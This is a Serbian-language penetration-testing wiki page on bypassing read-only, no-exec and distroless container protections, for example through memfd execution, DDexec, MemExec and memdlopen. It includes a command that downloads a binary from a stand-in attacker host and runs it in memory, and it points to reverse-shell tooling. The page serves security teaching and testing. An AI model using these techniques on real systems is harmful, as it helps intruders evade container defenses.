# Zaobilaženje FS zaštita: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Video zapisi

U sledećim video zapisima možete pronaći detaljnije objašnjene tehnike pomenute na ovoj stranici:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## read-only / no-exec scenario

Sve je češća pojava da se Linux mašine pokreću sa **read-only (ro) zaštitom fajl sistema**, naročito u kontejnerima. Razlog je to što je pokretanje kontejnera sa ro fajl sistemom jednostavno kao postavljanje **`readOnlyRootFilesystem: true`** u `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Međutim, čak i kada je fajl sistem montiran kao ro, **`/dev/shm`** će i dalje biti upisiv, pa nije tačno da ne možemo ništa da upišemo na disk. Ipak, ovaj folder će biti **montiran sa no-exec zaštitom**, pa, ako ovde preuzmete binary, **nećete moći da ga izvršite**.

> [!WARNING]
> Iz perspektive red team-a, ovo **otežava preuzimanje i izvršavanje** binary-ja koji se već ne nalaze na sistemu (kao što su backdoor-i ili enumeratori poput `kubectl`).

## Najlakši bypass: skripte

Imajte na umu da sam pomenuo binary-je: možete **izvršiti bilo koju skriptu** sve dok se interpreter nalazi na mašini, na primer **shell script** ako je `sh` prisutan ili **python** **script** ako je `python` instaliran.

Međutim, ovo samo po sebi nije dovoljno za izvršavanje vašeg binary backdoor-a ili drugih binary alata koje možda morate da pokrenete.

## Zaobilaženja putem memorije

Ako želite da izvršite binary, ali fajl sistem to ne dozvoljava, najbolji način je da ga **izvršite iz memorije**, pošto se **zaštite tamo ne primenjuju**.

### FD + exec syscall bypass

Ako na mašini imate neke moćne script engine-e, kao što su **Python**, **Perl** ili **Ruby**, možete preuzeti binary koji treba izvršiti u memoriju, smestiti ga u memory file descriptor (`create_memfd` syscall), na koji se te zaštite neće primenjivati, a zatim pozvati **`exec` syscall** i navesti **fd kao fajl koji treba izvršiti**.

Za ovo možete jednostavno koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Možete mu proslediti binary, a on će generisati script u navedenom jeziku, sa **kompresovanim i b64 kodiranim binary-jem**, kao i instrukcijama za njegovo **dekodiranje i dekompresovanje** u **fd** kreiran pozivanjem `create_memfd` syscall-a, nakon čega sledi poziv **exec** syscall-a za njegovo pokretanje.

> [!WARNING]
> Ovo ne funkcioniše u drugim scripting jezicima, kao što su PHP ili Node, zato što oni nemaju **podrazumevani način za pozivanje raw syscall-ova** iz script-a, pa nije moguće pozvati `create_memfd` radi kreiranja **memory fd-a** u koji bi se smestio binary.
>
> Pored toga, kreiranje **regularnog fd-a** sa fajlom u `/dev/shm` neće funkcionisati, jer ga nećete moći pokrenuti: na njega će se primeniti **no-exec zaštita**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam omogućava da **izmenite memoriju sopstvenog procesa** prepisivanjem njegovog **`/proc/self/mem`**.

Zahvaljujući kontroli nad assembly kodom koji proces izvršava, možete upisati **shellcode** i „mutirati“ proces tako da **izvršava proizvoljan kod**.

> [!TIP]
> **DDexec / EverythingExec** vam omogućava da učitate i **izvršite** sopstveni **shellcode** ili **bilo koji binary** iz **memorije**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Za više informacija o ovoj tehnici pogledajte Github ili:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je prirodni sledeći korak nakon DDexec-a. To je **DDexec shellcode demonizovan**, tako da svaki put kada želite da **pokrenete drugi binary** ne morate ponovo da pokrećete DDexec; možete samo da pokrenete memexec shellcode putem DDexec tehnike, a zatim **komunicirate sa ovim daemon-om da biste prosledili nove binary-je za učitavanje i pokretanje**.

Primer upotrebe **memexec-a za izvršavanje binary-ja iz PHP reverse shell-a** možete pronaći na [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Sa sličnom namenom kao DDexec, tehnika [**memdlopen**](https://github.com/arget13/memdlopen) omogućava **jednostavniji način učitavanja binary-ja** u memoriju radi njihovog kasnijeg izvršavanja. Može omogućiti čak i učitavanje binary-ja sa dependencies.

## Distroless Bypass

Za posebno objašnjenje **šta distroless zapravo jeste**, kada pomaže, kada ne pomaže i kako menja post-exploitation tradecraft u container-ima, pogledajte:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Šta je distroless

Distroless container-i sadrže samo **minimalne komponente neophodne za pokretanje određene aplikacije ili service-a**, kao što su library-ji i runtime dependencies, ali isključuju veće komponente kao što su package manager, shell ili system utilities.

Cilj distroless container-a je da **smanje attack surface container-a uklanjanjem nepotrebnih komponenti** i minimizovanjem broja vulnerabilities koje mogu biti exploit-ovane.

### Reverse Shell

U distroless container-u možda **nećete pronaći čak ni `sh` ili `bash`** za dobijanje regularnog shell-a. Takođe nećete pronaći binary-je kao što su `ls`, `whoami`, `id`... odnosno sve ono što obično pokrećete na system-u.

> [!WARNING]
> Zbog toga **nećete moći da dobijete** **reverse shell** niti da **enumerate-ujete** system na uobičajen način.

Međutim, ako compromised container, na primer, pokreće flask web aplikaciju, onda je python instaliran i možete preuzeti **Python reverse shell**. Ako pokreće node, možete preuzeti Node rev shell, a isto važi za gotovo bilo koji **scripting language**.

> [!TIP]
> Korišćenjem scripting language-a možete **enumerate-ovati system** pomoću mogućnosti tog language-a.

Ako ne postoje **`read-only/no-exec`** protections, možete abuse-ovati svoj reverse shell da **upišete binary-je u file system** i **izvršite** ih.

> [!TIP]
> Međutim, u ovoj vrsti container-a ove protections obično postoje, ali možete koristiti **prethodne memory execution tehnike da ih zaobiđete**.

Primeri za **exploit-ovanje nekih RCE vulnerabilities** radi dobijanja **reverse shell-ova scripting language-a** i izvršavanja binary-ja iz memorije dostupni su na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## Reference

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
